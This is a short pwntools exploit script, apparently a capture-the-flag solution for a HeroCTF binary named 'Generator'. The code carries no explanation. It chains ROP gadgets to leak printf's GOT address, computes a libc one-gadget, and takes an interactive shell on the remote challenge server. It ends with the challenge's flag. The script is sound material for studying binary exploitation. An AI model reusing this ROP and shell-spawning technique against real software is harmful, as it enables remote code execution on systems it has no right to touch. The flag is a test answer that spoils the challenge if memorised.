from pwn import *

fname = './Generator'

local = False
host,port = 'pwn.heroctf.fr', 8000

p = ELF(fname)
r = process(fname) if local else remote(host, port)


pop_rdi_rsi_rdx = 0x0000000000401222
syscall_pop_ret = 0x0000000000401229
xchg_rax_rdx = 0x0000000000401226
pop_rdx_ret = 0x0000000000401224
pop_rsi_rdx = 0x0000000000401223

def get_header():
	r.recvuntil(b') ')


def send_payload(payload):
	r.sendline(payload)

if __name__=='__main__':
	get_header()
	if local:
		gdb.attach(r,'''
			b *0x0000000000401380
			c
		''')
	
	send_payload(b'yes\x00\x00'+b'\x00\x00\x00\x00'+p64(pop_rdx_ret)*2+p64(0x1)+p64(xchg_rax_rdx)+p64(pop_rdi_rsi_rdx)+p64(0x1)+p64(p.got['printf'])+p64(0x8)+p64(syscall_pop_ret)+p64(0x0)+p64(p.sym['_start']))
	r.recvline()
	leak_printf = u64(r.recv(8))
	log.info('printf @ {}'.format(hex(leak_printf)))
	
	magic = (leak_printf - 0x604e0)+0xeacf2
	get_header()
	log.info(hex(magic))
	send_payload(b'yes\x00\x00'+b'\x00\x00\x00\x00'+p64(pop_rsi_rdx)*2+p64(0x0)+p64(0x0)+p64(magic))


	r.interactive()
	
# Hero{Pr3tty_c00l_x64_R0P_1ntr0_r1ght???}

